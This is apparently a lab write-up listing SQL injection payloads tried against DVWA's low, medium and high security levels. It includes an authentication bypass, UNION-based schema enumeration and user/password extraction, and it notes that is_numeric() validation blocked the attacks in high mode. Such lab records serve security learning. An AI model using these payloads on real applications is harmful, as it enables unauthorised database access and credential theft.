# Commands Used

## LOW Security Level

### Basic Enumeration

```sql
1
2
3
4
5
```

### Authentication Bypass

```sql
1' OR '1'='1#
```

### Database Version Discovery

```sql
1' UNION SELECT user(),version()#
```

### Database Enumeration

```sql
1' UNION SELECT schema_name,NULL FROM information_schema.schemata#
```

### Table Enumeration

```sql
1' UNION SELECT table_name,table_schema FROM information_schema.tables#
```

### Column Enumeration

```sql
1' UNION SELECT column_name,table_name FROM information_schema.columns#
```

### User Data Extraction

```sql
1' UNION SELECT user,password FROM users#
```

---

## MEDIUM Security Level

### Numeric Testing

```sql
1
2
3
```

### Quote Testing

```sql
'
"
```

### Boolean Testing

```sql
1 OR 1=1
```

### UNION Testing

```sql
1 UNION SELECT NULL,NULL
```

Observed behavior depended on filtering mechanisms implemented by DVWA.

---

## HIGH Security Level

### Enumeration

```sql
1
2
3
4
5
```

Results:

1 → admin

2 → Gordon Brown

3 → Hack Me

4 → Pablo Picasso

5 → Bob Smith

---

### Numeric Coercion Tests

```sql
0001
1.0
2.0
3.0
```

Accepted by application.

---

### Scientific Notation

```sql
1e0
1e1
```

1e0 returned admin.

1e1 returned no record.

---

### Traditional SQL Injection Payloads

```sql
1' OR '1'='1
```

```sql
1 UNION SELECT NULL,NULL
```

```sql
1' UNION SELECT user(),version()#
```

```sql
1 OR 1=1
```

All blocked by validation logic.

---

## Source Code Controls

```php
$id = stripslashes($id);
$id = mysql_real_escape_string($id);

if(is_numeric($id))
{
    ...
}
```

The is_numeric() validation was the primary reason exploitation failed in HIGH mode.
